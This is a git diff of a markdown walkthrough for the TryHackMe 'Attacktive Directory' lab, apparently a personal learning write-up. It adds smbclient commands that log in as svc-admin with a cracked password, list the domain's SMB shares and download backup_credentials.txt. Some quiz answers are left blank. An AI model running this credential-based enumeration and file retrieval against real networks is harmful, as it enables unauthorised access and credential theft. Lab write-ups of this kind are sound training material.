@@ -16,7 +16,7 @@ Room Link: https://tryhackme.com/r/room/attacktivedirectory
 1. NMap
 2. [kerbrute](https://github.com/ropnop/kerbrute/releases)
 3. Impacket
-4. 
+4. smbclient
 
 ## Deploy The Machine
 1. Goto Access and get ovpn file to connect https://tryhackme.com/access Or, Start attackbox for testing.
@@ -116,12 +116,42 @@ Room Link: https://tryhackme.com/r/room/attacktivedirectory
 7. Question `Now crack the hash with the modified password list provided, what is the user accounts password?` Answer `management2005`
    
 ## Back to the Basics
-1. Question `What utility can we use to map remote SMB shares?` Answer `smbclient`
-2. Question `Which option will list shares?` Answer `-L`
-3. Question `How many remote shares is the server listing?` Answer ``
-4. Question `There is one particular share that we have access to that contains a text file. Which share is it?` Answer ``
-5. Question `What is the content of the file?` Answer ``
-6. Question `Decoding the contents of the file, what is the full contents?` Answer ``
+1. If we enumerate with smbclient we can see some shares. Used command `smbclient -L \\\\spookysec.local\\ -U 'svc-admin'` using password `management2005`. 
+```bash
+smbclient -L \\\\spookysec.local\\ -U 'svc-admin'
+Password for [WORKGROUP\svc-admin]:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	backup          Disk      
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	SYSVOL          Disk      Logon server share 
+SMB1 disabled -- no workgroup available
+```
+2. If we check `backup` share with `smbclient` using `smbclient \\\\spookysec.local\\backup -U 'svc-admin'` command and password `management2005`, We can see `backup_credentials.txt` file there with `ls` or `dir` command. Then we can download `backup_credentials.txt` with `get backup_credentials.txt` command.
+```bash
+ORKGROUP\svc-admin]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sun Apr  5 00:38:39 2020
+  ..                                  D        0  Sun Apr  5 00:38:39 2020
+  backup_credentials.txt              A       48  Sun Apr  5 00:38:53 2020
+
+		8247551 blocks of size 4096. 3648829 blocks available
+smb: \> get backup_credentials.txt
+getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+smb: \> 
+
+```
+3. Question `What utility can we use to map remote SMB shares?` Answer `smbclient`
+4. Question `Which option will list shares?` Answer `-L`
+5. Question `How many remote shares is the server listing?` Answer ``
+6. Question `There is one particular share that we have access to that contains a text file. Which share is it?` Answer ``
+7. Question `What is the content of the file?` Answer ``
+8. Question `Decoding the contents of the file, what is the full contents?` Answer ``
 ## Elevating Privileges within the Domain
 
 ## Flag Submission Panel
